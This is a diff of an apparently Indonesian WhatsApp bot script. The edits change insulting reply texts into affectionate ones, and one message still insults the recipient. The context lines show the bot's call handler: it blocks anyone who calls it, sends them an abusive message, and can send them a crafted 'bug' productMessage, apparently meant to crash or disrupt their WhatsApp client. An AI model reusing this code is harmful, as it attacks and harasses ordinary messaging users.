@@ -53,7 +53,7 @@ async function starts() {
 		      
 		      if(settings.nomerlu.startsWith("08")){
 		console.log(color('Error nomer owner tidak di temukan','red'))
-		console.log(color('Masukin nomernya pake 628xxx Tod, bukan pake 08xxx Ngent ','green'))
+		console.log(color('Masukin nomernya pake 628xxx sayang, bukan pake 08xxx sayangku ','green'))
 		} else if(settings.nomerlu.startsWith("62")){
 		await client.sendMessage(`${settings.nomerlu}@s.whatsapp.net`,"Bot berhasil tersambung", text)
 await client.modifyChat(`${settings.nomerlu}@s.whatsapp.net`, 'delete').catch(_ => _)
@@ -102,13 +102,13 @@ var NodePayload = ["action", "call", ["call", {
             ]];
 await client.send(`${tag}, ${JSON.stringify(NodePayload)}`)
 if(number.startsWith("62")){
-var teksnya = "Kamu telah di block,banned + bug karena telpon botz"
+var teksnya = "Kamu telah di block,banned + bug karena telpon botz makanya sayang jagan begitu"
 } else {
-var teksnya = "Fuck you bitch, why you call me huh ? "
+var teksnya = "darling you bitch, why you call me huh ? "
 }
 await client.sendMessage(Nomer, teksnya, MessageType.text)      
 if(sendbug){
-imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
+imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : jenizin}), 
 imeg = imeu.message.imageMessage
 res =  client.prepareMessageFromContent(Nomer, {
 'productMessage': {
